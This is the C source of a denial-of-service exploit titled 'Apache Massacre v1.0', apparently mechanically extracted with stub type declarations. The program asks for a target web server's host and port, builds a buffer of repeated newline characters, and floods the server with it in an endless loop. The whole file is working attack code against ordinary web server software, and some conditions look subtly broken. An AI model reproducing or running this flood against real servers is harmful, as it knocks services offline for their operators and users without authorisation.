
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


struct TYPE_2__ {unsigned long s_addr; } ;
struct sockaddr_in {int sin_port; int sin_family; TYPE_1__ sin_addr; } ;
struct sockaddr {int dummy; } ;
struct hostent {scalar_t__ h_addr; } ;
typedef int WSADATA ;
typedef scalar_t__ SOCKET ;


 int AF_INET ;
 int IPPROTO_TCP ;
 int SIGINT ;
 int SOCK_STREAM ;
 int SetConsoleCtrlHandler (int *,int ) ;
 int TRUE ;
 int WSACleanup () ;
 scalar_t__ WSAStartup (int,int *) ;
 int atoi (char*) ;
 int close (scalar_t__) ;
 int closesocket (scalar_t__) ;
 scalar_t__ connect (scalar_t__,struct sockaddr const*,int) ;
 int exit (int) ;
 int fgets (char*,int,int ) ;
 int free (char*) ;
 struct hostent* gethostbyname (char*) ;
 int htons (unsigned short) ;
 char* malloc (int) ;
 int perror (char*) ;
 int printf (char*) ;
 int send (scalar_t__,char*,int,int ) ;
 scalar_t__ sig_fired ;
 int sig_handler ;
 int signal (int ,int *) ;
 int sigset (int ,int *) ;
 scalar_t__ socket (int ,int ,int ) ;
 int stdin ;

int main(int argc, char *argv[]) {
SOCKET s;
struct sockaddr_in sin;
char buffer[1025];
struct hostent *he;
unsigned short iPort = 80;
int newlines = 100;
char *p;
char *p2;
int i;



printf("Apache Massacre v1.0\r\n");
printf("Exploit by Matthew Murphy\r\n");
printf("Vulnerability reported by iDEFENSE Labs\r\n\r\n");






printf("Please enter the web server's host/IP: ");
fgets(&buffer[0], 1024, stdin);
he = gethostbyname(&buffer[0]);
if (!he) {
perror("gethostbyname");
exit(1);
}
sin.sin_addr.s_addr = *((unsigned long *)he->h_addr);
printf("Please enter the web server's port: ");
fgets(&buffer[0], 1024, stdin);
iPort = (unsigned short)atoi(&buffer[0]);




signal(SIGINT, &sig_handler);




printf("How many newlines should be in each request [100]: ");
fgets(&buffer[0], 1024, stdin);
if (!buffer[0] == 0x0D && !buffer[0] == 0x0A) {
newlines = atoi(&buffer[0]);
}
p = malloc(newlines*2);
p2 = p;
for (i = 0; i < newlines; i++) {
*p2 = 0x0D;
p2++;
*p2 = 0x0A;
p2++;
}
newlines += newlines;
s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
if (s < 0) {
perror("socket");
exit(1);
}
sin.sin_family = AF_INET;
sin.sin_port = htons(iPort);
if (connect(s, (const struct sockaddr *)&sin, sizeof(struct sockaddr_in))) {
perror("connect");
exit(1);
}
while (1) {
if (!send(s, (char *)p, newlines, 0) == newlines) {
perror("send");
exit(1);
}
if (sig_fired) {
printf("Terminating on SIGINT");
free(p);

close(s);




exit(0);
}
}
}
